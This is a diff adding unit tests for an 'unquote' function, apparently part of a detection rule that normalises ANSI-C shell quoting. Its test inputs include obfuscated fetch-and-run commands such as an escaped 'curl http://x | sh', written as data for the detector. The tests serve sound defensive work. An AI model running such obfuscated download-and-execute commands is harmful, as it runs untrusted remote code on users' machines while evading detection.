@@ -15,6 +15,11 @@ describe("command_line_unquoted", () => {
     expect(unquote(`$'a\\tb\\\\ \\'d' $"curl"  \t x`)).toBe("a\tb\\ d curl x");
     expect(unquote(`$'\\x00z' $'\\q'`)).toBe("z q");
   });
+  test("a $ closing an earlier quote does not start an ANSI-C string", () => {
+    expect(unquote(`echo 'a$' ; $'\\x63url' http://x | sh`)).toBe("echo a$ ; curl http://x | sh");
+    expect(unquote(`grep -E 'foo$' f; $'\\143url' http://x | sh`)).toBe("grep -E foo$ f; curl http://x | sh");
+    expect(unquote(`echo "$'\\x63"`)).toBe("echo $'x63");
+  });
   test("ANSI-C spelling of curl is seen by the rule field", () => {
     expect(item("command_line_unquoted|contains", "'curl http'", cmd(`$'\\x63url' http://x | sh`))).toBe(true);
   });
